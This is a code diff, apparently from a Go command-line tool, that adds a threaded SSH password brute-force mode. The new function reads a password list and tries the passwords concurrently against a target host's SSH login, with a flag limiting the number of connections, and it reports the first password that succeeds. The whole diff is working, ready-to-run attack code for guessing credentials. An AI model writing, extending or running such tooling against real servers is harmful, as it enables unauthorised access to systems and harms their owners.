@@ -5,6 +5,7 @@ import (
 	"errors"
 	"fmt"
 	"os"
+	"sync"
 
 	"golang.org/x/crypto/ssh"
 
@@ -83,6 +84,55 @@ func BruteForceList(host string, port int, username string, pass_list string) (s
 	return "", errors.New("brute force failed")
 }
 
+func ThreadedBruteForce(host string, port int, username string, pass_list string, max_nb int) (string, error) {
+	file, err := os.Open(pass_list)
+	if err != nil {
+		return "", err
+	}
+	defer file.Close()
+
+	var candidates []string
+	scanner := bufio.NewScanner(file)
+
+	for scanner.Scan() {
+		candidates = append(candidates, scanner.Text())
+	}
+
+	if err := scanner.Err(); err != nil {
+		logger.Error().Err(err).Msg("Failed to read password list file")
+	}
+
+	var wg sync.WaitGroup
+	var once sync.Once
+	sem := make(chan struct{}, max_nb) // Throttle ssh connections
+	passwordChan := make(chan string)
+
+	for _, password := range candidates {
+		wg.Add(1)
+		sem <- struct{}{}
+		go func(password string) {
+			defer wg.Done()
+			defer func() { <-sem }()
+			if BruteForce(host, port, username, password) {
+				once.Do(func() {
+					passwordChan <- password
+				})
+			}
+		}(password)
+	}
+
+	go func() {
+		wg.Wait()
+		close(passwordChan)
+	}()
+
+	if password, ok := <-passwordChan; ok {
+		return password, nil
+	}
+
+	return "", errors.New("brute force failed")
+}
+
 func main() {
 	// logger setup
 	zerolog.TimeFieldFormat = zerolog.TimeFormatUnix
@@ -123,6 +173,11 @@ func main() {
 		Default:  false,
 	})
 
+	threaded := parser.Int("t", "threaded", &argparse.Options{
+		Required: false,
+		Help:     "Enable threaded brute force mode with a limit of n threads",
+	})
+
 	// parse arguments
 
 	if err := parser.Parse(os.Args); err != nil {
@@ -146,12 +201,20 @@ func main() {
 
 		logger.Debug().Str("host", *host).Int("port", *port).Str("username", *username).Str("password_list", *pass_list).Msg("Trying password list")
 
-		password, err := BruteForceList(*host, *port, *username, *pass_list)
-		if err != nil {
-			logger.Fatal().Err(err).Msg("Brute force failed")
+		if *threaded > 0 {
+			logger.Debug().Msg("Threaded brute force mode enabled")
+			password, err := ThreadedBruteForce(*host, *port, *username, *pass_list, *threaded)
+			if err != nil {
+				logger.Fatal().Err(err).Msg("Brute force failed")
+			}
+			successLogger(*host, *port, *username, password)
+		} else {
+			password, err := BruteForceList(*host, *port, *username, *pass_list)
+			if err != nil {
+				logger.Fatal().Err(err).Msg("Brute force failed")
+			}
+			successLogger(*host, *port, *username, password)
 		}
-		successLogger(*host, *port, *username, password)
-
 	} else {
 		if !BruteForce(*host, *port, *username, *password) {
 			logger.Warn().Str("host", *host).Int("port", *port).Str("username", *username).Str("password", *password).Msg("Brute force failed")
